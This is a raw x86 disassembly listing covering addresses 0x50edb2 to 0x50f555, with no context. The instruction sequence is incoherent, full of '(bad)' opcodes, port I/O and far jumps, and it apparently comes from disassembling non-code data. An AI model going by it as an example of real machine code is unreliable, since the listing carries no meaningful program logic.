  50edb2:	ret    
  50edb3:	nop
  50edb4:	stos   DWORD PTR es:[edi],eax
  50edb5:	mov    ah,0x69
  50edb7:	push   ds
  50edb8:	xor    bl,BYTE PTR [edi+0xe]
  50edbb:	lahf   
  50edbc:	dec    eax
  50edbd:	sbb    BYTE PTR ds:0xa43c3941,cl
  50edc3:	fistp  DWORD PTR [ebp+0x71]
  50edc6:	push   ss
  50edc7:	or     eax,0x4f064ebb
  50edcc:	into   
  50edcd:	xor    eax,0x7defe184
  50edd2:	add    DWORD PTR [esi-0x17],ecx
  50edd5:	or     al,0xe5
  50edd7:	rcl    BYTE PTR [ecx],1
  50edd9:	aam    0x26
  50eddb:	dec    BYTE PTR gs:[esi-0x72ce2478]
  50ede2:	pop    esp
  50ede3:	pop    ss
  50ede4:	test   BYTE PTR ds:[ebp-0x2ba5a8ff],bl
  50edeb:	popf   
  50edec:	push   ss
  50eded:	sub    al,0x85
  50edef:	jg     0x50ee6d
  50edf1:	push   edi
  50edf2:	add    al,0xf
  50edf4:	xor    esp,DWORD PTR ds:0x1d74112c
  50edfa:	in     eax,0xd4
  50edfc:	add    al,0x80
  50edfe:	mov    esp,0xb19fbbcf
  50ee03:	jne    0x50ed9e
  50ee05:	mov    al,ds:0x51c5c0e7
  50ee0a:	ror    DWORD PTR [edi-0x73ef241e],0xa6
  50ee11:	sub    eax,DWORD PTR [edx]
  50ee13:	push   esi
  50ee14:	jns    0x50edc7
  50ee16:	and    eax,0xe1373bd5
  50ee1b:	xlat   BYTE PTR ds:[ebx]
  50ee1c:	dec    esi
  50ee1d:	nop
  50ee1e:	sub    dl,dh
  50ee20:	mov    eax,ds:0x6daeafe3
  50ee25:	and    al,BYTE PTR [esi]
  50ee27:	test   BYTE PTR [ebx-0x1],0x2f
  50ee2b:	jnp    0x50ee02
  50ee2d:	scas   eax,DWORD PTR es:[edi]
  50ee2e:	mul    DWORD PTR [esi]
  50ee30:	mov    al,0x19
  50ee32:	cdq    
  50ee33:	add    al,0x5
  50ee35:	inc    ebp
  50ee36:	lods   eax,DWORD PTR ds:[esi]
  50ee37:	push   0x43
  50ee39:	sbb    ebp,DWORD PTR [esi+ebx*2]
  50ee3c:	fstp   QWORD PTR [edi+0x5a]
  50ee3f:	call   0x897d:0xa6153d5d
  50ee46:	push   ebx
  50ee47:	daa    
  50ee48:	jae    0x50ee0b
  50ee4a:	mov    ecx,eax
  50ee4c:	xchg   esi,eax
  50ee4d:	lods   eax,DWORD PTR ds:[esi]
  50ee4e:	cmovge ecx,DWORD PTR [edi-0x37]
  50ee52:	cld    
  50ee53:	sti    
  50ee54:	inc    ecx
  50ee55:	mov    dl,BYTE PTR [esi+0x27f06240]
  50ee5b:	in     al,dx
  50ee5c:	stc    
  50ee5d:	enter  0x4f51,0xa8
  50ee61:	out    dx,eax
  50ee62:	pop    ss
  50ee63:	or     ecx,DWORD PTR [ebx-0xff86e09]
  50ee69:	pop    esp
  50ee6a:	pop    ecx
  50ee6b:	pop    ecx
  50ee6c:	add    esp,DWORD PTR [eax-0x52]
  50ee6f:	cmp    esp,DWORD PTR [edx+edi*8+0x10091ff9]
  50ee76:	sbb    bl,al
  50ee78:	xchg   esi,eax
  50ee79:	scas   al,BYTE PTR es:[edi]
  50ee7a:	cld    
  50ee7b:	mov    ah,bl
  50ee7d:	mov    bl,0xac
  50ee7f:	xor    al,bh
  50ee81:	out    dx,eax
  50ee82:	aaa    
  50ee83:	sbb    ebp,DWORD PTR [ebp+0x24]
  50ee86:	xor    bh,al
  50ee88:	fild   QWORD PTR [ebx-0x22e587d6]
  50ee8e:	dec    ebx
  50ee8f:	xor    dh,BYTE PTR [ecx-0x2c]
  50ee92:	repnz push edi
  50ee94:	dec    edx
  50ee95:	mov    al,BYTE PTR [edi+0x16595078]
  50ee9b:	push   esp
  50ee9c:	pop    ss
  50ee9d:	mov    edi,0x924053d8
  50eea2:	test   al,0x72
  50eea4:	lahf   
  50eea5:	adc    al,0xfd
  50eea7:	push   0x10
  50eea9:	iret   
  50eeaa:	in     al,dx
  50eeab:	mov    dh,0x8e
  50eead:	test   al,0x7d
  50eeaf:	(bad)  
  50eeb1:	lock out 0x70,eax
  50eeb4:	dec    esi
  50eeb5:	push   esi
  50eeb6:	cmp    eax,0x64bc6f85
  50eebb:	sbb    eax,0x4357fe8b
  50eec0:	jmp    0x2a96a1de
  50eec5:	ret    
  50eec6:	shl    BYTE PTR [ecx],cl
  50eec8:	(bad)  
  50eec9:	in     al,dx
  50eeca:	mov    ebx,0xf929f721
  50eecf:	jae    0x50ef09
  50eed1:	push   ebp
  50eed2:	mov    edi,0x8038d627
  50eed7:	jmp    0x646293a7
  50eedc:	mov    ds:0x5bfbb67b,eax
  50eee1:	xor    al,0xaa
  50eee3:	mov    gs,WORD PTR [eax-0x12cb23ca]
  50eee9:	and    DWORD PTR [ebp-0x5c22163b],ebp
  50eeef:	jnp    0x50eea1
  50eef1:	jle    0x50eee4
  50eef3:	aam    0xa
  50eef5:	sahf   
  50eef6:	dec    edx
  50eef7:	push   0x325a7400
  50eefc:	fs and dh,al
  50eeff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  50ef00:	xor    edx,DWORD PTR [edi]
  50ef02:	repnz sahf 
  50ef04:	(bad)  
  50ef05:	out    dx,eax
  50ef06:	(bad)  
  50ef07:	leave  
  50ef08:	or     bl,BYTE PTR [esi]
  50ef0a:	mov    bl,0xea
  50ef0c:	xor    BYTE PTR [edx-0x384d6c6d],cl
  50ef12:	inc    eax
  50ef13:	lods   al,BYTE PTR ds:[esi]
  50ef14:	jno    0x50eeb5
  50ef16:	add    eax,0x9712e32c
  50ef1b:	cmp    ah,BYTE PTR [edx]
  50ef1d:	hlt    
  50ef1e:	mov    ss,WORD PTR [edi-0x49ca63cd]
  50ef24:	sub    DWORD PTR [eax+ebx*1],ecx
  50ef27:	xchg   ecx,eax
  50ef28:	in     al,0x2e
  50ef2a:	adc    bl,al
  50ef2c:	jns    0x50ef89
  50ef2e:	mov    bh,0xbf
  50ef30:	mov    DWORD PTR [esi],esp
  50ef32:	mov    al,cl
  50ef34:	fucomp st(3)
  50ef36:	stos   DWORD PTR es:[edi],eax
  50ef37:	lock mov ds:0x9f393be2,al
  50ef3d:	les    eax,FWORD PTR [ebx+0x112df73a]
  50ef43:	fs cmc 
  50ef45:	lods   eax,DWORD PTR ds:[esi]
  50ef46:	pop    esi
  50ef47:	cli    
  50ef48:	sar    edx,0x32
  50ef4b:	adc    DWORD PTR [ecx+0x206b2177],ebp
  50ef51:	rcl    edi,0x89
  50ef54:	lods   eax,DWORD PTR ds:[esi]
  50ef55:	jns    0x50ef7b
  50ef57:	arpl   WORD PTR [ecx+0x76],di
  50ef5a:	jbe    0x50ef35
  50ef5c:	mov    eax,0x9a38f61d
  50ef61:	ror    BYTE PTR [esi+0x46032be9],cl
  50ef67:	cmc    
  50ef68:	cmp    dl,BYTE PTR [ebx]
  50ef6a:	inc    edx
  50ef6b:	pop    es
  50ef6c:	(bad)  
  50ef6d:	pop    esp
  50ef6e:	xchg   edi,eax
  50ef6f:	jecxz  0x50ef8e
  50ef71:	sbb    ebp,DWORD PTR [eax]
  50ef73:	arpl   cx,sp
  50ef75:	xor    al,bl
  50ef77:	push   ss
  50ef78:	adc    BYTE PTR [edi-0x1ab2b35f],dl
  50ef7e:	lds    esp,FWORD PTR [eax+0x46]
  50ef81:	adc    eax,0xee906456
  50ef86:	and    DWORD PTR [eax],edx
  50ef88:	cld    
  50ef89:	repnz mov bl,0x0
  50ef8c:	sub    BYTE PTR [ebp-0x23],ch
  50ef8f:	js     0x50efdf
  50ef91:	clc    
  50ef92:	jmp    0x50ef8c
  50ef94:	jnp    0x50ef26
  50ef96:	into   
  50ef97:	dec    esi
  50ef98:	xor    esi,DWORD PTR [esi-0x75986cbb]
  50ef9e:	sub    eax,0x600b1264
  50efa3:	cmp    al,0xd8
  50efa5:	mov    bh,0x93
  50efa7:	cmp    DWORD PTR [edx+0x779de438],0x3a01e76b
  50efb1:	nop
  50efb2:	into   
  50efb3:	in     al,0x86
  50efb5:	mov    ecx,0xb1c99549
  50efba:	pop    esp
  50efbb:	in     eax,0x40
  50efbd:	outs   dx,BYTE PTR ds:[esi]
  50efbe:	mov    edx,0x73d1d5f8
  50efc3:	dec    ebx
  50efc4:	test   eax,0x46c1e224
  50efc9:	and    eax,0xc48c8318
  50efce:	es sbb esi,ebp
  50efd1:	add    al,0x11
  50efd3:	mov    bh,0x8
  50efd5:	mov    BYTE PTR [edi],bl
  50efd7:	shl    esp,0xd9
  50efda:	mov    cs,esp
  50efdc:	repnz adc al,0xcf
  50efdf:	shl    ebp,cl
  50efe1:	mov    bh,0xd0
  50efe3:	rcr    BYTE PTR [esi+0x44],1
  50efe6:	ror    bh,0x73
  50efe9:	repz scas al,BYTE PTR es:[edi]
  50efeb:	pop    sp
  50efed:	and    bh,BYTE PTR [ecx-0x2f]
  50eff0:	dec    ebx
  50eff1:	retf   
  50eff2:	(bad)  
  50eff3:	push   esp
  50eff4:	sahf   
  50eff5:	out    dx,eax
  50eff6:	outs   dx,DWORD PTR ds:[esi]
  50eff7:	aam    0x7d
  50eff9:	(bad)  
  50effa:	test   DWORD PTR [eax],edx
  50effc:	(bad)  
  50effd:	pop    esi
  50effe:	stc    
  50efff:	daa    
  50f000:	jae    0x50f03a
  50f002:	mov    WORD PTR [ebx+0x77],gs
  50f005:	jge    0x50f06f
  50f007:	sahf   
  50f008:	sub    al,0xba
  50f00a:	dec    ecx
  50f00b:	xchg   ecx,eax
  50f00c:	out    dx,eax
  50f00d:	aad    0xa0
  50f00f:	rcr    DWORD PTR [ebx],1
  50f011:	xchg   edi,eax
  50f012:	cmc    
  50f013:	adc    DWORD PTR gs:[ebp+0x4fb22436],esi
  50f01a:	call   0x2b60:0x83fdffda
  50f021:	cdq    
  50f022:	popf   
  50f023:	inc    edx
  50f024:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  50f025:	repz out 0xfc,al
  50f028:	inc    ebx
  50f029:	push   ss
  50f02a:	ret    0xa241
  50f02d:	jne    0x50f017
  50f02f:	fcomp  QWORD PTR [esi-0x25]
  50f032:	lahf   
  50f033:	mov    eax,0xf039fba1
  50f038:	push   edi
  50f039:	cli    
  50f03a:	mov    ah,0x92
  50f03c:	in     eax,dx
  50f03d:	out    dx,al
  50f03e:	cmc    
  50f03f:	pushf  
  50f040:	sub    ecx,DWORD PTR [edx-0x37df6dad]
  50f046:	not    BYTE PTR [edi-0x3bd7828]
  50f04c:	in     al,dx
  50f04d:	cs call 0xdaf17b2b
  50f053:	inc    ecx
  50f054:	mov    bh,BYTE PTR [eax]
  50f056:	cmc    
  50f057:	(bad)
  50f05a:	push   ecx
  50f05b:	mul    DWORD PTR [ebx+0x4a]
  50f05e:	xlat   BYTE PTR ds:[ebx]
  50f05f:	mov    al,ds:0x3b66dee4
  50f064:	inc    ecx
  50f065:	adc    ebp,ebx
  50f067:	in     eax,0xc
  50f069:	mov    esp,0xb36ec98a
  50f06e:	ja     0x50f07a
  50f070:	xchg   esi,eax
  50f071:	inc    ebp
  50f072:	push   eax
  50f073:	nop
  50f074:	test   al,0x30
  50f076:	retf   
  50f077:	cli    
  50f078:	cmp    eax,0x4944f9b
  50f07d:	jmp    0x50f0e5
  50f07f:	call   0x639f5853
  50f084:	rol    BYTE PTR [ebp+0x585f21c7],cl
  50f08a:	dec    ecx
  50f08b:	fld    QWORD PTR [edi-0x394e8cb1]
  50f091:	dec    DWORD PTR [ebx+0x5f]
  50f094:	push   esi
  50f095:	imul   edi,DWORD PTR [edi+ebx*4],0x8c24fdec
  50f09c:	inc    ebx
  50f09d:	out    dx,al
  50f09e:	xlat   BYTE PTR ds:[ebx]
  50f09f:	(bad)  
  50f0a1:	xchg   BYTE PTR [ecx+edx*8-0x73],cl
  50f0a5:	or     eax,0x9eeeabcc
  50f0aa:	cmp    ch,bl
  50f0ac:	xor    al,0xf
  50f0ae:	xchg   ecx,eax
  50f0af:	(bad)  
  50f0b0:	pop    ds
  50f0b1:	xor    al,dl
  50f0b3:	jae    0x50f0cc
  50f0b5:	lods   eax,DWORD PTR ds:[esi]
  50f0b6:	scas   al,BYTE PTR es:[edi]
  50f0b7:	int    0x3f
  50f0b9:	push   0xffffffa3
  50f0bb:	bnd jnp 0x50f134
  50f0be:	push   0xb515896d
  50f0c3:	push   0x55
  50f0c5:	mov    dl,BYTE PTR [esi+0x5a]
  50f0c8:	sub    al,0xe0
  50f0cb:	jg     0x50f051
  50f0cd:	sbb    eax,ecx
  50f0cf:	xor    al,0xef
  50f0d1:	push   es
  50f0d2:	fwait
  50f0d3:	xchg   BYTE PTR [edi+0x47],bl
  50f0d6:	fidiv  DWORD PTR [ecx-0x5c5056ae]
  50f0dc:	xor    DWORD PTR [edx-0x3f7f60eb],edx
  50f0e2:	retf   
  50f0e3:	jmp    0x5d6a:0xd5f930f2
  50f0ea:	std    
  50f0eb:	pop    edx
  50f0ec:	sub    esi,DWORD PTR [esi+0x25f53661]
  50f0f2:	mov    esi,0x7d97cf12
  50f0f7:	or     eax,0x711dba1f
  50f0fc:	cdq    
  50f0fd:	mov    edx,0x967eeea1
  50f102:	adc    al,0x88
  50f104:	push   0x2b
  50f106:	and    ebp,DWORD PTR [esi]
  50f108:	out    0xd9,al
  50f10a:	outs   dx,DWORD PTR ds:[esi]
  50f10b:	dec    ecx
  50f10c:	or     ebx,0xffffffa9
  50f10f:	cs push edi
  50f111:	cmp    al,0x47
  50f113:	sbb    DWORD PTR [edi+0x27],eax
  50f116:	sub    dh,BYTE PTR [eax-0x2d]
  50f119:	shr    DWORD PTR [eax],cl
  50f11b:	sbb    eax,0x312ae566
  50f120:	repz sbb eax,0x6f04f479
  50f126:	cmp    DWORD PTR [edi+ebp*2+0x21],edx
  50f12a:	jne    0x50f0be
  50f12c:	push   ds
  50f12d:	pusha  
  50f12e:	mov    ds:0xc9f38061,al
  50f133:	sbb    BYTE PTR [edx-0x76],bh
  50f136:	je     0x50f162
  50f138:	cdq    
  50f139:	sbb    eax,DWORD PTR [eax+0x6d]
  50f13c:	aad    0xd5
  50f13e:	or     al,0x1d
  50f140:	mov    cl,0x78
  50f142:	sub    DWORD PTR [edi],edx
  50f144:	jmp    0x1be5:0x298868
  50f14b:	or     eax,0x648ae8f2
  50f150:	mov    ch,BYTE PTR [ebp+edx*2+0x18720c3]
  50f157:	adc    al,0x65
  50f159:	shr    BYTE PTR [ecx],1
  50f15b:	inc    ebx
  50f15c:	inc    ebx
  50f15d:	push   ebp
  50f15e:	jne    0x50f164
  50f160:	sub    eax,0x9a5b8c5c
  50f165:	fs mov esp,0x532022b8
  50f16b:	xor    eax,0xbd20d26b
  50f170:	sar    ebx,0x4c
  50f173:	push   edx
  50f174:	dec    edx
  50f175:	add    al,0xcf
  50f177:	fld    DWORD PTR [eax+0x284c102c]
  50f17d:	push   esi
  50f17e:	mov    ecx,0x4029f9c3
  50f183:	leave  
  50f184:	dec    eax
  50f185:	mov    es,WORD PTR [edi]
  50f187:	cld    
  50f188:	sti    
  50f189:	and    edi,DWORD PTR [esi+0x26904480]
  50f18f:	jno    0x50f1a8
  50f191:	mov    eax,ds:0x9caf356b
  50f196:	rol    BYTE PTR [ecx-0x687a0d9e],1
  50f19c:	fnsave [ebx+0x5]
  50f19f:	cld    
  50f1a0:	in     ax,dx
  50f1a2:	jb     0x50f17e
  50f1a4:	inc    edi
  50f1a5:	dec    ebx
  50f1a6:	or     dl,BYTE PTR [edi+0xe]
  50f1a9:	ja     0x50f132
  50f1ab:	cdq    
  50f1ac:	jne    0x50f144
  50f1ae:	(bad)  
  50f1af:	call   FWORD PTR [esi]
  50f1b1:	imul   ebp,DWORD PTR ds:0x1296cbcf,0x55034688
  50f1bb:	or     eax,0xccd36aa4
  50f1c0:	aaa    
  50f1c1:	(bad)  
  50f1c2:	out    dx,al
  50f1c3:	mov    dl,BYTE PTR [ebx-0x17d90a44]
  50f1c9:	sbb    eax,ebp
  50f1cb:	scas   al,BYTE PTR es:[edi]
  50f1cc:	inc    ebx
  50f1cd:	inc    ecx
  50f1cf:	ret    0xa98f
  50f1d2:	xchg   ebx,eax
  50f1d3:	jo     0x50f21b
  50f1d5:	jecxz  0x50f21d
  50f1d7:	fsub   QWORD PTR ds:0x1b22a52b
  50f1dd:	pushf  
  50f1de:	push   ss
  50f1df:	retf   
  50f1e0:	aam    0x51
  50f1e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  50f1e3:	push   eax
  50f1e4:	fs adc eax,0xf4f93312
  50f1ea:	cmp    eax,0x6c0efa36
  50f1ef:	mov    ch,bh
  50f1f1:	sti    
  50f1f2:	pop    esp
  50f1f3:	test   BYTE PTR [edx],bh
  50f1f5:	test   al,0x73
  50f1f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  50f1f8:	push   edx
  50f1f9:	mov    esp,0xbdba2a4d
  50f1fe:	pop    ecx
  50f1ff:	scas   al,BYTE PTR es:[edi]
  50f200:	or     al,BYTE PTR [esi+0x26]
  50f203:	fst    DWORD PTR [ebp-0x53995ea6]
  50f209:	pushf  
  50f20a:	sub    eax,0xc4454211
  50f20f:	cwd    
  50f211:	add    ah,dh
  50f213:	xchg   ebp,eax
  50f214:	aaa    
  50f215:	mov    cl,0xdd
  50f217:	js     0x50f246
  50f219:	fwait
  50f21a:	clc    
  50f21b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  50f21c:	push   edi
  50f21d:	loopne 0x50f28e
  50f21f:	mov    bl,0x32
  50f221:	xchg   esp,eax
  50f222:	neg    DWORD PTR [ecx-0x67]
  50f225:	loop   0x50f272
  50f227:	enter  0xcd05,0xf2
  50f22b:	sbb    ebx,edi
  50f22d:	popa   
  50f22e:	fsubrp st(4),st
  50f230:	or     eax,0x810e288f
  50f235:	inc    eax
  50f236:	and    dh,ch
  50f238:	add    BYTE PTR [ecx],ch
  50f23a:	dec    ecx
  50f23b:	mov    ds:0x60e9e6fb,eax
  50f240:	add    al,0x43
  50f242:	xchg   DWORD PTR [ebx],esp
  50f244:	push   eax
  50f245:	mov    bh,BYTE PTR [eax-0x1a2cfb2f]
  50f24b:	int    0x9a
  50f24d:	(bad)  
  50f24e:	fmul   DWORD PTR [esp+eiz*8-0x45f1a67e]
  50f255:	mov    al,0xd7
  50f257:	jb     0x50f207
  50f259:	sti    
  50f25a:	shr    ebp,1
  50f25c:	mov    dh,0x4c
  50f25e:	mov    WORD PTR [esi],gs
  50f260:	call   0xb406:0x74746c9a
  50f267:	(bad)  
  50f269:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  50f26a:	jbe    0x50f23a
  50f26c:	(bad)  
  50f26d:	adc    al,0x9f
  50f26f:	xor    eax,DWORD PTR [ebp+eiz*2-0x6392462f]
  50f276:	pusha  
  50f277:	jmp    0xf8f7:0x93dc6e0c
  50f27e:	cmp    DWORD PTR [ecx+edi*2-0x47],esi
  50f282:	add    BYTE PTR [ecx-0x51],ah
  50f285:	sbb    al,0x88
  50f287:	xor    bh,BYTE PTR [esi-0x1c]
  50f28a:	xchg   edi,eax
  50f28b:	std    
  50f28c:	jo     0x50f2e9
  50f28e:	(bad)  
  50f28f:	adc    al,0xf7
  50f291:	pop    eax
  50f292:	xchg   edi,eax
  50f293:	shl    BYTE PTR [eax-0x6fb108f7],0x8c
  50f29a:	dec    ecx
  50f29b:	mov    ah,0xa9
  50f29d:	sbb    eax,0x6f8af8ca
  50f2a2:	push   0xee0e40c4
  50f2a7:	mov    esi,0x610b5a72
  50f2ac:	inc    eax
  50f2ad:	pandn  mm3,mm7
  50f2b0:	ja     0x50f310
  50f2b2:	pop    eax
  50f2b3:	repz xchg ecx,eax
  50f2b5:	pop    fs
  50f2b7:	das    
  50f2b8:	jb     0x50f283
  50f2ba:	push   eax
  50f2bb:	sub    eax,0xf472b5fd
  50f2c1:	xor    dl,al
  50f2c3:	adc    BYTE PTR [ebp-0x3a63e6b0],bh
  50f2c9:	inc    ecx
  50f2ca:	or     eax,0xc7f11275
  50f2cf:	and    dl,BYTE PTR [edi+0x77]
  50f2d2:	mov    edi,0xf3a23d0c
  50f2d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  50f2d8:	sbb    eax,0x909f42ff
  50f2dd:	int    0x3
  50f2df:	(bad)  
  50f2e0:	fimul  DWORD PTR [esi-0x75e0cdeb]
  50f2e6:	push   esi
  50f2e7:	aam    0xc7
  50f2e9:	in     al,0x90
  50f2eb:	mov    dh,0xdf
  50f2ed:	sbb    ax,0xcf66
  50f2f1:	jp     0x50f297
  50f2f3:	cmp    eax,0x368cfe0e
  50f2f8:	and    BYTE PTR [ebx-0x7e],0x28
  50f2fc:	hlt    
  50f2fd:	fiadd  WORD PTR [ecx]
  50f2ff:	sbb    DWORD PTR [ecx-0x20],esp
  50f302:	jmp    0x257fb838
  50f307:	cli    
  50f308:	out    dx,al
  50f309:	mov    al,ds:0x7ded0dc5
  50f30e:	xchg   edx,eax
  50f30f:	sbb    DWORD PTR [eax-0x45],ebp
  50f312:	cmc    
  50f313:	pop    ebx
  50f314:	mov    gs,WORD PTR [esi-0x745dd60a]
  50f31a:	push   ss
  50f31b:	cld    
  50f31c:	std    
  50f31d:	xchg   edx,eax
  50f31e:	shl    DWORD PTR [edi-0x6bbbdf9d],0x10
  50f325:	inc    esp
  50f326:	(bad)  
  50f327:	loop   0x50f38c
  50f329:	mov    al,0x8d
  50f32b:	shl    BYTE PTR [edx+edi*1-0x3e3ce36e],0x63
  50f333:	xor    BYTE PTR [edi+0x1e],bh
  50f336:	xor    BYTE PTR [edi-0x2a],bh
  50f339:	dec    edi
  50f33a:	cmp    eax,0xea7a77f7
  50f33f:	dec    esi
  50f340:	and    al,0xc3
  50f342:	add    eax,0xac0f3d58
  50f347:	xor    eax,ecx
  50f349:	xor    BYTE PTR ds:0x699a1a7a,bl
  50f34f:	cmp    DWORD PTR [ebx-0x2c75df22],ebp
  50f355:	loop   0x50f35a
  50f357:	xor    ch,al
  50f359:	inc    ecx
  50f35a:	and    BYTE PTR [edx+edi*1+0x2680e2ae],0x6a
  50f362:	mov    ebx,0x3f038456
  50f367:	out    dx,al
  50f368:	inc    ebp
  50f369:	ror    eax,0x18
  50f36c:	xchg   edx,eax
  50f36d:	ret    0xb2d3
  50f370:	cmp    eax,DWORD PTR [ecx+0x64]
  50f373:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  50f374:	pusha  
  50f375:	sbb    al,BYTE PTR [edi+0x3f]
  50f378:	leave  
  50f379:	jle    0x50f35d
  50f37b:	cdq    
  50f37c:	push   DWORD PTR [esp+eax*1+0x90c5a9b]
  50f383:	push   edx
  50f384:	stos   BYTE PTR es:[edi],al
  50f385:	sbb    esi,esp
  50f387:	xor    ebx,edi
  50f389:	aaa    
  50f38a:	pop    ebx
  50f38b:	fld    QWORD PTR ds:0x94a11fdb
  50f391:	cmp    al,0xc4
  50f393:	ins    DWORD PTR es:[edi],dx
  50f394:	mov    eax,ds:0x77e2b75d
  50f399:	std    
  50f39a:	std    
  50f39b:	in     al,dx
  50f39c:	xchg   esp,eax
  50f39d:	sets   dl
  50f3a0:	add    BYTE PTR [edi+esi*8-0x6f],bl
  50f3a4:	pop    edi
  50f3a5:	scas   eax,DWORD PTR es:[edi]
  50f3a6:	pop    ecx
  50f3a7:	dec    edi
  50f3a8:	(bad)  
  50f3a9:	sub    al,0xd7
  50f3ab:	cli    
  50f3ac:	adc    ebp,eax
  50f3ae:	push   ecx
  50f3af:	mov    ecx,0x5b2046aa
  50f3b4:	dec    eax
  50f3b5:	imul   edx,edi,0x64
  50f3b8:	jp     0x50f3c2
  50f3ba:	fldenv [ebx+eiz*2-0x33]
  50f3be:	jae    0x50f3ca
  50f3c0:	aas    
  50f3c1:	mov    eax,ds:0xc8ce7e2b
  50f3c6:	jg     0x50f426
  50f3c8:	fwait
  50f3c9:	push   ecx
  50f3ca:	retf   
  50f3cb:	cli    
  50f3cc:	inc    esi
  50f3cd:	sbb    eax,0x5ef7ead5
  50f3d2:	into   
  50f3d3:	dec    esi
  50f3d4:	iret   
  50f3d5:	repnz inc edx
  50f3d7:	mov    cl,0x4
  50f3d9:	cld    
  50f3da:	mov    eax,ds:0xaa253c20
  50f3df:	jl     0x50f3ab
  50f3e1:	mov    ebp,0x64aa43cc
  50f3e6:	add    al,0x46
  50f3e8:	ss mov dh,0x97
  50f3eb:	cld    
  50f3ec:	std    
  50f3ed:	fisubr DWORD PTR [ecx-0xe]
  50f3f0:	or     eax,0x84d40a1f
  50f3f5:	fisttp QWORD PTR [ebp+0x6a]
  50f3f8:	clc    
  50f3f9:	and    ch,BYTE PTR [edi+0x7b99e945]
  50f3ff:	in     al,0x11
  50f401:	ror    esp,cl
  50f403:	add    eax,0x6c2d03c4
  50f408:	dec    ebx
  50f409:	out    0x37,al
  50f40b:	imul   DWORD PTR [esi+0x59]
  50f40e:	test   eax,0x444f6c8b
  50f413:	add    eax,0xf8dd9b25
  50f418:	repz jg 0x50f3cf
  50f41b:	inc    ebx
  50f41c:	js     0x50f3e9
  50f41e:	jl     0x50f3be
  50f420:	sbb    al,0x74
  50f422:	add    eax,0x11d6e470
  50f427:	aas    
  50f428:	and    edx,eax
  50f42a:	pop    edi
  50f42b:	cli    
  50f42c:	fistp  DWORD PTR [edx-0x15ce397d]
  50f432:	mov    ecx,0x8d59928
  50f437:	(bad)  [ebp+0x7d91973d]
  50f43d:	cmp    al,0xc7
  50f43f:	xor    BYTE PTR [edx-0x30603ec0],0xaa
  50f446:	imul   ebx,DWORD PTR [eax+0x55],0xffffffdb
  50f44a:	and    eax,0xe8729ae3
  50f44f:	dec    ebp
  50f450:	lea    ebx,[eax+ebx*2]
  50f453:	mov    ecx,0x4b636252
  50f458:	mov    cl,0x61
  50f45a:	clc    
  50f45b:	jno    0x50f434
  50f45d:	sbb    eax,0x3214c9f0
  50f462:	push   ebx
  50f463:	push   esi
  50f464:	stos   DWORD PTR es:[edi],eax
  50f465:	mov    eax,0x9875db1f
  50f46a:	or     al,0x65
  50f46c:	add    eax,0x8b3a3555
  50f471:	sub    DWORD PTR [ebx],ecx
  50f473:	mov    ds:0xe53255f0,al
  50f478:	out    dx,al
  50f479:	ret    0x5728
  50f47c:	out    dx,al
  50f47d:	inc    edx
  50f47e:	mov    ecx,0xe33904e4
  50f483:	dec    ecx
  50f484:	mov    bh,0x27
  50f486:	push   cs
  50f487:	stc    
  50f488:	pusha  
  50f489:	lock add edi,ebp
  50f48c:	lea    ebx,[esi]
  50f48e:	mov    edx,0x5b11b8d1
  50f493:	loope  0x50f430
  50f495:	xor    al,BYTE PTR [edx+ebp*4+0x27ffa830]
  50f49c:	xor    eax,0xae24ac8c
  50f4a1:	jecxz  0x50f522
  50f4a3:	out    dx,al
  50f4a4:	gs (bad) 
  50f4a6:	enter  0xc99c,0xed
  50f4aa:	out    dx,eax
  50f4ab:	dec    edi
  50f4ac:	fadd   QWORD PTR [ecx+ebx*2+0x4ca8bc10]
  50f4b3:	loopne 0x50f480
  50f4b5:	adc    al,0x9c
  50f4b7:	dec    esi
  50f4b8:	mov    WORD PTR [edx-0x32],fs
  50f4bb:	fs push esi
  50f4bd:	adc    eax,0x3857ebec
  50f4c2:	add    BYTE PTR ds:0x1e2fb348,cl
  50f4c8:	fsub   st,st(1)
  50f4ca:	jns    0x50f4f5
  50f4cc:	push   edx
  50f4cd:	push   ebp
  50f4ce:	popf   
  50f4cf:	(bad)  
  50f4d0:	adc    cl,BYTE PTR [ecx*4+0x2c1d352c]
  50f4d7:	cs sar dh,0xfd
  50f4db:	inc    eax
  50f4dc:	out    0x54,al
  50f4de:	test   al,0x18
  50f4e0:	cmp    BYTE PTR [esi+0x3],cl
  50f4e3:	push   0xce26f737
  50f4e8:	cmp    BYTE PTR [eax+edx*4+0x46360fd2],al
  50f4ef:	fcmovbe st,st(0)
  50f4f1:	mov    eax,ds:0x88f1cb3
  50f4f6:	push   0x13
  50f4f8:	outs   dx,BYTE PTR ds:[esi]
  50f4f9:	sar    DWORD PTR [esi+0x73],1
  50f4fc:	pop    esp
  50f4fd:	dec    ecx
  50f4fe:	inc    esp
  50f4ff:	jmp    DWORD PTR [eax-0x68]
  50f502:	and    ah,dl
  50f504:	xchg   edx,esi
  50f506:	cmp    bh,bl
  50f508:	addr16 gs inc ebp
  50f50b:	and    ebp,DWORD PTR [ecx+ebx*8-0x43]
  50f50f:	and    DWORD PTR [edx],eax
  50f511:	stc    
  50f512:	mov    esp,eax
  50f514:	retf   
  50f515:	sub    BYTE PTR [ebp+0x5ab73177],0xe8
  50f51c:	xchg   ebx,eax
  50f51d:	pop    ecx
  50f51e:	cdq    
  50f51f:	jmp    0xd3cc21af
  50f524:	pop    ebp
  50f525:	mov    ecx,0x7fa2794d
  50f52a:	test   DWORD PTR [eax],edi
  50f52c:	dec    esp
  50f52d:	(bad)  [eax]
  50f52f:	push   0x4ad63d97
  50f534:	or     BYTE PTR [eax+ecx*4+0x7091d4b2],0xb7
  50f53c:	(bad)  
  50f53d:	sar    ebp,1
  50f53f:	push   ebp
  50f540:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  50f541:	test   DWORD PTR [esi],esp
  50f543:	lods   al,BYTE PTR ds:[esi]
  50f544:	inc    ebx
  50f545:	xchg   edx,eax
  50f546:	(bad)  
  50f548:	jnp    0x50f556
  50f54a:	jnp    0x50f557
  50f54c:	std    
  50f54d:	das    
  50f54e:	mov    eax,0x83e611
  50f553:	ja     0x50f504
  50f555:	data16 shl BYTE PTR [ebp-0x6a7c4651],cl
